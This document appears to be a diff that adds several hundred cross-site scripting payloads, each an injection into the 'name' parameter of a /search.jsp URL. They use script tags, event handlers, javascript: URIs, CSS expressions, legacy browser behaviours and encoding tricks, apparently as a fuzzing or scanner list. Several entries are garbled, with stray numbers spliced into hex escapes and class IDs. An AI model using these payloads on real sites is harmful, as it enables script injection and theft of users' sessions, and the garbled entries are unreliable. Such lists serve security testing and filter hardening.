+/search.jsp?name=ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1534)">DEF
+/search.jsp?name=ABC<div style="x:\x20expression(javascript:alert(1535)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1536)">DEF
+/search.jsp?name=ABC<div style="x:\x00expression(javascript:alert(1537)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1538)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1539)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1540)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1541)">DEF
+/search.jsp?name=ABC<div style="x:\x0Bexpression(javascript:alert(1542)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x81543expression(javascript:alert(1543)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1544)">DEF
+/search.jsp?name=ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1545)">DEF
+/search.jsp?name=<a href="\x0Bjavascript:javascript:alert(1546)" id="fuzzelement1546">test</a>
+/search.jsp?name=<a href="\x0Fjavascript:javascript:alert(1547)" id="fuzzelement1547">test</a>
+/search.jsp?name=<a href="\xC2\xA0javascript:javascript:alert(1548)" id="fuzzelement1548">test</a>
+/search.jsp?name=<a href="\x05javascript:javascript:alert(1549)" id="fuzzelement1549">test</a>
+/search.jsp?name=<a href="\xE1550\xA0\x8Ejavascript:javascript:alert(1550)" id="fuzzelement1550">test</a>
+/search.jsp?name=<a href="\x15518javascript:javascript:alert(1551)" id="fuzzelement1551">test</a>
+/search.jsp?name=<a href="\x15521552javascript:javascript:alert(1552)" id="fuzzelement1552">test</a>
+/search.jsp?name=<a href="\xE2\x80\x88javascript:javascript:alert(1553)" id="fuzzelement1553">test</a>
+/search.jsp?name=<a href="\xE2\x80\x89javascript:javascript:alert(1554)" id="fuzzelement1554">test</a>
+/search.jsp?name=<a href="\xE2\x80\x80javascript:javascript:alert(1555)" id="fuzzelement1555">test</a>
+/search.jsp?name=<a href="\x15567javascript:javascript:alert(1556)" id="fuzzelement1556">test</a>
+/search.jsp?name=<a href="\x03javascript:javascript:alert(1557)" id="fuzzelement1557">test</a>
+/search.jsp?name=<a href="\x0Ejavascript:javascript:alert(1558)" id="fuzzelement1558">test</a>
+/search.jsp?name=<a href="\x1559Ajavascript:javascript:alert(1559)" id="fuzzelement1559">test</a>
+/search.jsp?name=<a href="\x00javascript:javascript:alert(1560)" id="fuzzelement1560">test</a>
+/search.jsp?name=<a href="\x15610javascript:javascript:alert(1561)" id="fuzzelement1561">test</a>
+/search.jsp?name=<a href="\xE2\x80\x82javascript:javascript:alert(1562)" id="fuzzelement1562">test</a>
+/search.jsp?name=<a href="\x20javascript:javascript:alert(1563)" id="fuzzelement1563">test</a>
+/search.jsp?name=<a href="\x15643javascript:javascript:alert(1564)" id="fuzzelement1564">test</a>
+/search.jsp?name=<a href="\x09javascript:javascript:alert(1565)" id="fuzzelement1565">test</a>
+/search.jsp?name=<a href="\xE2\x80\x8Ajavascript:javascript:alert(1566)" id="fuzzelement1566">test</a>
+/search.jsp?name=<a href="\x15674javascript:javascript:alert(1567)" id="fuzzelement1567">test</a>
+/search.jsp?name=<a href="\x15689javascript:javascript:alert(1568)" id="fuzzelement1568">test</a>
+/search.jsp?name=<a href="\xE2\x80\xAFjavascript:javascript:alert(1569)" id="fuzzelement1569">test</a>
+/search.jsp?name=<a href="\x1570Fjavascript:javascript:alert(1570)" id="fuzzelement1570">test</a>
+/search.jsp?name=<a href="\xE2\x80\x81571javascript:javascript:alert(1571)" id="fuzzelement1571">test</a>
+/search.jsp?name=<a href="\x1572Djavascript:javascript:alert(1572)" id="fuzzelement1572">test</a>
+/search.jsp?name=<a href="\xE2\x80\x87javascript:javascript:alert(1573)" id="fuzzelement1573">test</a>
+/search.jsp?name=<a href="\x07javascript:javascript:alert(1574)" id="fuzzelement1574">test</a>
+/search.jsp?name=<a href="\xE1575\x9A\x80javascript:javascript:alert(1575)" id="fuzzelement1575">test</a>
+/search.jsp?name=<a href="\xE2\x80\x83javascript:javascript:alert(1576)" id="fuzzelement1576">test</a>
+/search.jsp?name=<a href="\x04javascript:javascript:alert(1577)" id="fuzzelement1577">test</a>
+/search.jsp?name=<a href="\x01578javascript:javascript:alert(1578)" id="fuzzelement1578">test</a>
+/search.jsp?name=<a href="\x08javascript:javascript:alert(1579)" id="fuzzelement1579">test</a>
+/search.jsp?name=<a href="\xE2\x80\x84javascript:javascript:alert(1580)" id="fuzzelement1580">test</a>
+/search.jsp?name=<a href="\xE2\x80\x86javascript:javascript:alert(1581)" id="fuzzelement1581">test</a>
+/search.jsp?name=<a href="\xE3\x80\x80javascript:javascript:alert(1582)" id="fuzzelement1582">test</a>
+/search.jsp?name=<a href="\x15832javascript:javascript:alert(1583)" id="fuzzelement1583">test</a>
+/search.jsp?name=<a href="\x0Djavascript:javascript:alert(1584)" id="fuzzelement1584">test</a>
+/search.jsp?name=<a href="\x0Ajavascript:javascript:alert(1585)" id="fuzzelement1585">test</a>
+/search.jsp?name=<a href="\x0Cjavascript:javascript:alert(1586)" id="fuzzelement1586">test</a>
+/search.jsp?name=<a href="\x15875javascript:javascript:alert(1587)" id="fuzzelement1587">test</a>
+/search.jsp?name=<a href="\xE2\x80\xA8javascript:javascript:alert(1588)" id="fuzzelement1588">test</a>
+/search.jsp?name=<a href="\x15896javascript:javascript:alert(1589)" id="fuzzelement1589">test</a>
+/search.jsp?name=<a href="\x02javascript:javascript:alert(1590)" id="fuzzelement1590">test</a>
+/search.jsp?name=<a href="\x1591Bjavascript:javascript:alert(1591)" id="fuzzelement1591">test</a>
+/search.jsp?name=<a href="\x06javascript:javascript:alert(1592)" id="fuzzelement1592">test</a>
+/search.jsp?name=<a href="\xE2\x80\xA9javascript:javascript:alert(1593)" id="fuzzelement1593">test</a>
+/search.jsp?name=<a href="\xE2\x80\x85javascript:javascript:alert(1594)" id="fuzzelement1594">test</a>
+/search.jsp?name=<a href="\x1595Ejavascript:javascript:alert(1595)" id="fuzzelement1595">test</a>
+/search.jsp?name=<a href="\xE2\x81596\x9Fjavascript:javascript:alert(1596)" id="fuzzelement1596">test</a>
+/search.jsp?name=<a href="\x1597Cjavascript:javascript:alert(1597)" id="fuzzelement1597">test</a>
+/search.jsp?name=<a href="javascript\x00:javascript:alert(1598)" id="fuzzelement1598">test</a>
+/search.jsp?name=<a href="javascript\x3A:javascript:alert(1599)" id="fuzzelement1599">test</a>
+/search.jsp?name=<a href="javascript\x09:javascript:alert(1600)" id="fuzzelement1600">test</a>
+/search.jsp?name=<a href="javascript\x0D:javascript:alert(1601)" id="fuzzelement1601">test</a>
+/search.jsp?name=<a href="javascript\x0A:javascript:alert(1602)" id="fuzzelement1602">test</a>
+/search.jsp?name=`"'><img src=xxx:x \x0Aonerror=javascript:alert(1603)>
+/search.jsp?name=`"'><img src=xxx:x \x22onerror=javascript:alert(1604)>
+/search.jsp?name=`"'><img src=xxx:x \x0Bonerror=javascript:alert(1605)>
+/search.jsp?name=`"'><img src=xxx:x \x0Donerror=javascript:alert(1606)>
+/search.jsp?name=`"'><img src=xxx:x \x2Fonerror=javascript:alert(1607)>
+/search.jsp?name=`"'><img src=xxx:x \x09onerror=javascript:alert(1608)>
+/search.jsp?name=`"'><img src=xxx:x \x0Conerror=javascript:alert(1609)>
+/search.jsp?name=`"'><img src=xxx:x \x00onerror=javascript:alert(1610)>
+/search.jsp?name=`"'><img src=xxx:x \x27onerror=javascript:alert(1611)>
+/search.jsp?name=`"'><img src=xxx:x \x20onerror=javascript:alert(1612)>
+/search.jsp?name="`'><script>\x3Bjavascript:alert(1613)</script>
+/search.jsp?name="`'><script>\x0Djavascript:alert(1614)</script>
+/search.jsp?name="`'><script>\xEF\xBB\xBFjavascript:alert(1615)</script>
+/search.jsp?name="`'><script>\xE2\x80\x81616javascript:alert(1616)</script>
+/search.jsp?name="`'><script>\xE2\x80\x84javascript:alert(1617)</script>
+/search.jsp?name="`'><script>\xE3\x80\x80javascript:alert(1618)</script>
+/search.jsp?name="`'><script>\x09javascript:alert(1619)</script>
+/search.jsp?name="`'><script>\xE2\x80\x89javascript:alert(1620)</script>
+/search.jsp?name="`'><script>\xE2\x80\x85javascript:alert(1621)</script>
+/search.jsp?name="`'><script>\xE2\x80\x88javascript:alert(1622)</script>
+/search.jsp?name="`'><script>\x00javascript:alert(1623)</script>
+/search.jsp?name="`'><script>\xE2\x80\xA8javascript:alert(1624)</script>
+/search.jsp?name="`'><script>\xE2\x80\x8Ajavascript:alert(1625)</script>
+/search.jsp?name="`'><script>\xE1626\x9A\x80javascript:alert(1626)</script>
+/search.jsp?name="`'><script>\x0Cjavascript:alert(1627)</script>
+/search.jsp?name="`'><script>\x2Bjavascript:alert(1628)</script>
+/search.jsp?name="`'><script>\xF0\x90\x96\x9Ajavascript:alert(1629)</script>
+/search.jsp?name="`'><script>-javascript:alert(1630)</script>
+/search.jsp?name="`'><script>\x0Ajavascript:alert(1631)</script>
+/search.jsp?name="`'><script>\xE2\x80\xAFjavascript:alert(1632)</script>
+/search.jsp?name="`'><script>\x7Ejavascript:alert(1633)</script>
+/search.jsp?name="`'><script>\xE2\x80\x87javascript:alert(1634)</script>
+/search.jsp?name="`'><script>\xE2\x81635\x9Fjavascript:alert(1635)</script>
+/search.jsp?name="`'><script>\xE2\x80\xA9javascript:alert(1636)</script>
+/search.jsp?name="`'><script>\xC2\x85javascript:alert(1637)</script>
+/search.jsp?name="`'><script>\xEF\xBF\xAEjavascript:alert(1638)</script>
+/search.jsp?name="`'><script>\xE2\x80\x83javascript:alert(1639)</script>
+/search.jsp?name="`'><script>\xE2\x80\x8Bjavascript:alert(1640)</script>
+/search.jsp?name="`'><script>\xEF\xBF\xBEjavascript:alert(1641)</script>
+/search.jsp?name="`'><script>\xE2\x80\x80javascript:alert(1642)</script>
+/search.jsp?name="`'><script>\x21643javascript:alert(1643)</script>
+/search.jsp?name="`'><script>\xE2\x80\x82javascript:alert(1644)</script>
+/search.jsp?name="`'><script>\xE2\x80\x86javascript:alert(1645)</script>
+/search.jsp?name="`'><script>\xE1646\xA0\x8Ejavascript:alert(1646)</script>
+/search.jsp?name="`'><script>\x0Bjavascript:alert(1647)</script>
+/search.jsp?name="`'><script>\x20javascript:alert(1648)</script>
+/search.jsp?name="`'><script>\xC2\xA0javascript:alert(1649)</script>
+/search.jsp?name="/><img/onerror=\x0Bjavascript:alert(1650)\x0Bsrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x22javascript:alert(1651)\x22src=xxx:x />
+/search.jsp?name="/><img/onerror=\x09javascript:alert(1652)\x09src=xxx:x />
+/search.jsp?name="/><img/onerror=\x27javascript:alert(1653)\x27src=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Ajavascript:alert(1654)\x0Asrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Cjavascript:alert(1655)\x0Csrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x0Djavascript:alert(1656)\x0Dsrc=xxx:x />
+/search.jsp?name="/><img/onerror=\x60javascript:alert(1657)\x60src=xxx:x />
+/search.jsp?name="/><img/onerror=\x20javascript:alert(1658)\x20src=xxx:x />
+/search.jsp?name=<script\x2F>javascript:alert(1659)</script>
+/search.jsp?name=<script\x20>javascript:alert(1660)</script>
+/search.jsp?name=<script\x0D>javascript:alert(1661)</script>
+/search.jsp?name=<script\x0A>javascript:alert(1662)</script>
+/search.jsp?name=<script\x0C>javascript:alert(1663)</script>
+/search.jsp?name=<script\x00>javascript:alert(1664)</script>
+/search.jsp?name=<script\x09>javascript:alert(1665)</script>
+/search.jsp?name="><img src=x onerror=javascript:alert(1666)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1667)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1668)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1669)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1670))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1671))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1672))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1673)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1674))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1675))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1676)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1677))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1678)>
+/search.jsp?name="><img src=x onerror=javascript:alert(1679))>
+/search.jsp?name="><img src=x onerror=javascript:alert(1680)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0B=javascript:alert(1681)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x00=javascript:alert(1682)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0C=javascript:alert(1683)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0D=javascript:alert(1684)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x20=javascript:alert(1685)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x0A=javascript:alert(1686)>
+/search.jsp?name=`"'><img src=xxx:x onerror\x09=javascript:alert(1687)>
+/search.jsp?name=<script>javascript:alert(1688)<\x00/script>
+/search.jsp?name=<img src=# onerror\x3D"javascript:alert(1689)" >
+/search.jsp?name=<input onfocus=javascript:alert(1690) autofocus>
+/search.jsp?name=<input onblur=javascript:alert(1691) autofocus><input autofocus>
+/search.jsp?name=<video poster=javascript:javascript:alert(1692)//
+/search.jsp?name=<body onscroll=javascript:alert(1693)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+/search.jsp?name=<form id=test onforminput=javascript:alert(1694)><input></form><button form=test onformchange=javascript:alert(1694)>X
+/search.jsp?name=<video><source onerror="javascript:javascript:alert(1695)">
+/search.jsp?name=<video onerror="javascript:javascript:alert(1696)"><source>
+/search.jsp?name=<form><button formaction="javascript:javascript:alert(1697)">X
+/search.jsp?name=<body oninput=javascript:alert(1698)><input autofocus>
+/search.jsp?name=<math href="javascript:javascript:alert(1699)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1699)">CLICKME</maction> </math>
+/search.jsp?name=<frameset onload=javascript:alert(1700)>
+/search.jsp?name=<table background="javascript:javascript:alert(1701)">
+/search.jsp?name=<!--<img src="--><img src=x onerror=javascript:alert(1702)//">
+/search.jsp?name=<comment><img src="</comment><img src=x onerror=javascript:alert(1703))//">
+/search.jsp?name=<![><img src="]><img src=x onerror=javascript:alert(1704)//">
+/search.jsp?name=<style><img src="</style><img src=x onerror=javascript:alert(1705)//">
+/search.jsp?name=<li style=list-style:url() onerror=javascript:alert(1706)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1706)></div>
+/search.jsp?name=<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1707)//#">XXX</a></body>
+/search.jsp?name=<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1708)</SCRIPT>
+/search.jsp?name=<OBJECT CLASSID="clsid:333C7BC4-460F-17091709D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1709)"></OBJECT>
+/search.jsp?name=<b <script>alert(1712)</script>0
+/search.jsp?name=<div id="div1713"><input value="``onmouseover=javascript:alert(1713)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1713").innerHTML;</script>
+/search.jsp?name=<x '="foo"><x foo='><img src=x onerror=javascript:alert(1714)//'>
+/search.jsp?name=<embed src="javascript:alert(1715)">
+/search.jsp?name=<img src="javascript:alert(1716)">
+/search.jsp?name=<image src="javascript:alert(1717)">
+/search.jsp?name=<script src="javascript:alert(1718)">
+/search.jsp?name=<div style=width:1719px;filter:glow onfilterchange=javascript:alert(1719)>x
+/search.jsp?name=<? foo="><script>javascript:alert(1720)</script>">
+/search.jsp?name=<! foo="><script>javascript:alert(1721)</script>">
+/search.jsp?name=</ foo="><script>javascript:alert(1722)</script>">
+/search.jsp?name=<? foo="><x foo='?><script>javascript:alert(1723)</script>'>">
+/search.jsp?name=<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1724)</script>">
+/search.jsp?name=<% foo><x foo="%><script>javascript:alert(1725)</script>">
+/search.jsp?name=<div id=d><x xmlns="><iframe onload=javascript:alert(1726)"></div> <script>d.innerHTML=d.innerHTML</script>
+/search.jsp?name=<img \x00src=x onerror="alert(1727)">
+/search.jsp?name=<img \x47src=x onerror="javascript:alert(1728)">
+/search.jsp?name=<img \x17291729src=x onerror="javascript:alert(1729)">
+/search.jsp?name=<img \x17302src=x onerror="javascript:alert(1730)">
+/search.jsp?name=<img\x47src=x onerror="javascript:alert(1731)">
+/search.jsp?name=<img\x17320src=x onerror="javascript:alert(1732)">
+/search.jsp?name=<img\x17333src=x onerror="javascript:alert(1733)">
+/search.jsp?name=<img\x32src=x onerror="javascript:alert(1734)">
+/search.jsp?name=<img\x47src=x onerror="javascript:alert(1735)">
+/search.jsp?name=<img\x17361736src=x onerror="javascript:alert(1736)">
+/search.jsp?name=<img \x47src=x onerror="javascript:alert(1737)">
+/search.jsp?name=<img \x34src=x onerror="javascript:alert(1738)">
+/search.jsp?name=<img \x39src=x onerror="javascript:alert(1739)">
+/search.jsp?name=<img \x00src=x onerror="javascript:alert(1740)">
+/search.jsp?name=<img src\x09=x onerror="javascript:alert(1741)">
+/search.jsp?name=<img src\x17420=x onerror="javascript:alert(1742)">
+/search.jsp?name=<img src\x17433=x onerror="javascript:alert(1743)">
+/search.jsp?name=<img src\x32=x onerror="javascript:alert(1744)">
+/search.jsp?name=<img src\x17452=x onerror="javascript:alert(1745)">
+/search.jsp?name=<img src\x17461746=x onerror="javascript:alert(1746)">
+/search.jsp?name=<img src\x00=x onerror="javascript:alert(1747)">
+/search.jsp?name=<img src\x47=x onerror="javascript:alert(1748)">
+/search.jsp?name=<img src=x\x09onerror="javascript:alert(1749)">
+/search.jsp?name=<img src=x\x17500onerror="javascript:alert(1750)">
+/search.jsp?name=<img src=x\x17511751onerror="javascript:alert(1751)">
+/search.jsp?name=<img src=x\x17522onerror="javascript:alert(1752)">
+/search.jsp?name=<img src=x\x17533onerror="javascript:alert(1753)">
+/search.jsp?name=<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1754)">
+/search.jsp?name=<img src=x onerror=\x09"javascript:alert(1755)">
+/search.jsp?name=<img src=x onerror=\x17560"javascript:alert(1756)">
+/search.jsp?name=<img src=x onerror=\x17571757"javascript:alert(1757)">
+/search.jsp?name=<img src=x onerror=\x17582"javascript:alert(1758)">
+/search.jsp?name=<img src=x onerror=\x32"javascript:alert(1759)">
+/search.jsp?name=<img src=x onerror=\x00"javascript:alert(1760)">
+/search.jsp?name=<a href=java&#1761&#2&#3&#4&#5&#6&#7&#8&#17611761&#17612script:javascript:alert(1761)>XXX</a>
+/search.jsp?name=<img src="x` `<script>javascript:alert(1762)</script>"` `>
+/search.jsp?name=<img src onerror /" '"= alt=javascript:alert(1763)//">
+/search.jsp?name=<title onpropertychange=javascript:alert(1764)></title><title title=>
+/search.jsp?name=<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1765)></a>">
+/search.jsp?name=<!--[if]><script>javascript:alert(1766)</script -->
+/search.jsp?name=<!--[if<img src=x onerror=javascript:alert(1767)//]> -->
+/search.jsp?name=<object id="x" classid="clsid:CB927D17702-4FF7-4a9e-A177069-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17707-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1770)" style="behavior:url(#x);"><param name=postdomevents /></object>
+/search.jsp?name=<a style="-o-link:'javascript:javascript:alert(1771)';-o-link-source:current">X
+/search.jsp?name=<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1772)'}{}*{-o-link-source:current}]{color:red};</style>
+/search.jsp?name=<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1773))%7d
+/search.jsp?name=<style>@import "data:,*%7bx:expression(javascript:alert(1774))%7D";</style>
+/search.jsp?name=<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1775);">XXX</a></a><a href="javascript:javascript:alert(1775)">XXX</a>
+/search.jsp?name=<// style=x:expression\28javascript:alert(1779)\29>
+/search.jsp?name=<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1780))}</style>
+/search.jsp?name=<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1782));">X
+/search.jsp?name=<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1788)}}).$=eval</script>
+/search.jsp?name=<script>({0:#0=eval/#0#/#0#(javascript:alert(1789))})</script>
+/search.jsp?name=<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1790)}),x</script>
+/search.jsp?name=<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1791)')()</script>
+/search.jsp?name=<meta charset="mac-farsi">¼script¾javascript:alert(1794)¼/script¾
+/search.jsp?name=X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1795)` >
+/search.jsp?name=1796<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41796vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1796)&gt;`>
+/search.jsp?name=1797<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1797)&gt;>
+/search.jsp?name=1799<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1799) strokecolor=white strokeweight=1799000px from=0 to=1799000 /></a>
+/search.jsp?name=<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1800)">XXX</a>
+/search.jsp?name=<event-source src="%(event)s" onload="javascript:alert(1803)">
+/search.jsp?name=<a href="javascript:javascript:alert(1804)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+/search.jsp?name=<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#18051805;src=x:x&#18051805;onerror&#18051805;=javascript:alert(1805)&gt;">
+/search.jsp?name=<script>javascript:alert(1809)</script>
+/search.jsp?name=<IMG SRC="javascript:javascript:alert(1810);">
+/search.jsp?name=<IMG SRC=javascript:javascript:alert(1811)>
+/search.jsp?name=<IMG SRC=`javascript:javascript:alert(1812)`>
+/search.jsp?name=<FRAMESET><FRAME SRC="javascript:javascript:alert(1814);"></FRAMESET>
+/search.jsp?name=<BODY ONLOAD=javascript:alert(1815)>
+/search.jsp?name=<BODY ONLOAD=javascript:javascript:alert(1816)>
+/search.jsp?name=<IMG SRC="jav ascript:javascript:alert(1817);">
+/search.jsp?name=<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1818)>
+/search.jsp?name=<IMG SRC="javascript:javascript:alert(1821)"
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1823);">
+/search.jsp?name=<IMG DYNSRC="javascript:javascript:alert(1824)">
+/search.jsp?name=<IMG LOWSRC="javascript:javascript:alert(1825)">
+/search.jsp?name=<BGSOUND SRC="javascript:javascript:alert(1826);">
+/search.jsp?name=<BR SIZE="&{javascript:alert(1827)}">
+/search.jsp?name=<LINK REL="stylesheet" HREF="javascript:javascript:alert(1829);">
+/search.jsp?name=<STYLE>li {list-style-image: url("javascript:javascript:alert(1833)");}</STYLE><UL><LI>XSS
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1834);">
+/search.jsp?name=<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1835);">
+/search.jsp?name=<IFRAME SRC="javascript:javascript:alert(1836);"></IFRAME>
+/search.jsp?name=<TABLE BACKGROUND="javascript:javascript:alert(1837)">
+/search.jsp?name=<TABLE><TD BACKGROUND="javascript:javascript:alert(1838)">
+/search.jsp?name=<DIV STYLE="background-image: url(javascript:javascript:alert(1839))">
+/search.jsp?name=<DIV STYLE="width:expression(javascript:alert(1840));">
+/search.jsp?name=<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1841))">
+/search.jsp?name=<XSS STYLE="xss:expression(javascript:alert(1842))">
+/search.jsp?name=<STYLE TYPE="text/javascript">javascript:alert(1843);</STYLE>
+/search.jsp?name=<STYLE>.XSS{background-image:url("javascript:javascript:alert(1844)");}</STYLE><A CLASS=XSS></A>
+/search.jsp?name=<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1845)")}</STYLE>
+/search.jsp?name=<!--[if gte IE 4]><SCRIPT>javascript:alert(1846);</SCRIPT><![endif]-->
+/search.jsp?name=<BASE HREF="javascript:javascript:alert(1847);//">
+/search.jsp?name=<OBJECT classid=clsid:ae24fdae-03c6-18491849d1849-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1849)></OBJECT>
+/search.jsp?name=<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1850)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+/search.jsp?name=<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1851)&lt;/SCRIPT&gt;"></BODY></HTML>
+/search.jsp?name=<form id="test" /><button form="test" formaction="javascript:javascript:alert(1854)">X
+/search.jsp?name=<body onscroll=javascript:alert(1855)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+/search.jsp?name=<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1856)">
+/search.jsp?name=<STYLE>a{background:url('s1858' 's2)}@import javascript:javascript:alert(1858);');}</STYLE>
+/search.jsp?name=<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1859)&&;&&<&&/script&&>
+/search.jsp?name=<SCRIPT onreadystatechange=javascript:javascript:alert(1860);></SCRIPT>
+/search.jsp?name=<style onreadystatechange=javascript:javascript:alert(1861);></style>
+/search.jsp?name=<?xml version="1862.0"?><html:html xmlns:html='http://www.w3.org/1862999/xhtml'><html:script>javascript:alert(1862);</html:script></html:html>
+/search.jsp?name=<embed code=javascript:javascript:alert(1864);></embed>
+/search.jsp?name=<frameset onload=javascript:javascript:alert(1866)></frameset>
+/search.jsp?name=<object onerror=javascript:javascript:alert(1867)>
+/search.jsp?name=<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1869);">]]</C><X></xml>
+/search.jsp?name=<IMG SRC=&{javascript:alert(1870);};>
+/search.jsp?name=<a href="jav&#65ascript:javascript:alert(1871)">test1871</a>
+/search.jsp?name=<a href="jav&#97ascript:javascript:alert(1872)">test1872</a>
+/search.jsp?name=<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1874)&amp;gt;>">
+/search.jsp?name=';alert(1875))//';alert(1875))//";
+/search.jsp?name=alert(1876))//";alert(1876))//--
+/search.jsp?name=></SCRIPT>">'><SCRIPT>alert(1877))</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(1880);">
+/search.jsp?name=<IMG SRC=javascript:alert(1881)>
+/search.jsp?name=<IMG SRC=JaVaScRiPt:alert(1882)>
+/search.jsp?name=<IMG SRC=javascript:alert(1883)>
+/search.jsp?name=<IMG SRC=`javascript:alert(1884)`>
+/search.jsp?name=<a onmouseover="alert(1885)">xxs link</a>
+/search.jsp?name=<a onmouseover=alert(1886)>xxs link</a>
+/search.jsp?name=<IMG """><SCRIPT>alert(1887)</SCRIPT>">
+/search.jsp?name=<IMG SRC=javascript:alert(1888))>
+/search.jsp?name=<IMG SRC=# onmouseover="alert(1889)">
+/search.jsp?name=<IMG SRC= onmouseover="alert(1890)">
+/search.jsp?name=<IMG onmouseover="alert(1891)">
+/search.jsp?name=<IMG SRC="jav ascript:alert(1895);">
+/search.jsp?name=<IMG SRC="jav&#x09;ascript:alert(1896);">
+/search.jsp?name=<IMG SRC="jav&#x0A;ascript:alert(1897);">
+/search.jsp?name=<IMG SRC="jav&#x0D;ascript:alert(1898);">
+/search.jsp?name=perl -e 'print "<IMG SRC=java\0script:alert(1899)>";' > out
+/search.jsp?name=<IMG SRC=" &#14;  javascript:alert(1900);">
+/search.jsp?name=<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1902)>
+/search.jsp?name=<<SCRIPT>alert(1904);//<</SCRIPT>
+/search.jsp?name=<IMG SRC="javascript:alert(1907)"
+/search.jsp?name=\";alert(1909);//
+/search.jsp?name=</TITLE><SCRIPT>alert(1910);</SCRIPT>
+/search.jsp?name=<INPUT TYPE="IMAGE" SRC="javascript:alert(1911);">
+/search.jsp?name=<BODY BACKGROUND="javascript:alert(1912)">
+/search.jsp?name=<IMG DYNSRC="javascript:alert(1913)">
